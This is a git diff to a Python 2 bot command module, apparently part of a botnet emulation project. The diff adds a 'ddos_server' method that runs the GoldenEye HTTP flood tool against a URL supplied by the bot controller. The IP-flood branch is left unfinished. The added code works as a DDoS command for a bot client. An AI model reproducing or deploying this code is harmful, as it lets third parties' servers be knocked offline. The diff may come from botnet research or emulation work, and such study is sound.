@@ -1,8 +1,7 @@
 #!/usr/bin/env python2
 # coding=UTF-8
-import logging, string
+import logging, string, subprocess, shlex
 from resources import emu_config
-
 
 def executeCurrentCommand(command):
     """Executes a command that has been passed to the bot
@@ -23,6 +22,7 @@ class BotCommands(object):
     """This class collects all methods that can be used as commands for a bot.
     To introduce a new command, simply add it to this class.
     It is also possible to add new methods during runtime."""
+    ddos_process = None
 
     def joinParams(self, hallo, hello):
         """Echos its parameters back"""
@@ -32,6 +32,18 @@ class BotCommands(object):
         """Echos its parameters back"""
         logging.info("default_command: %s" % kwargs)
 
+    def ddos_server(self, url=None, ip=None, timeout=10):
+        if self.ddos_process is None or not self.ddos_process.poll():
+            if url:
+                logging.debug("Execute goldeneye")
+                subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random -w 1 -s 2" % (timeout, url)))
+            elif ip:
+                # TODO: DDOS eine IP
+                pass
+            else:
+                logging.warning("Neither ip nor url where supplied, DDOS failed")
+        else:
+            logging.debug("goldeneye is still running")
 
 cmdobject = BotCommands()
 
